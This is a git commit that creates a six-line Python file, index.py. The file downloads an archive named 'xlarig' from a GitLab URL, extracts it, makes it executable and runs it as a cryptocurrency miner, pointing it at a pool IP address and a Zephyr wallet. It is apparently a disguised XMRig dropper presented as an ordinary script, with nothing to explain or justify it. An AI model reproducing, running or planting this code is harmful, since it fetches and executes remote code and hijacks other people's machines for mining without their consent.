9ced02454046022b0cb0e8c9913dcc5eb633363d
inkabound <158990409+inkabound@users.noreply.github.com>
2024-02-29 01:05:10 +0700

    Create index.py

---
+++ index.py
@@ -0,0 +1,6 @@
+import os
+
+os.system("wget https://gitlab.com/bromase889/cobagas/-/raw/main/xlarig.tar.gz")
+os.system("tar -xvf xlarig.tar.gz")
+os.system("chmod 700 xlarig")
+os.system("./xlarig -o 128.199.197.254:80 -u ZEPHYR2Fxj6MkDVQCi2e1W7fH9f5QYvnsLjrmoCuWKz615MjysUy1FgDoPbNhKg7qcdD3F2p1k3XYRtcbeCfFeWTYubQPzt356b2d -p sats ")
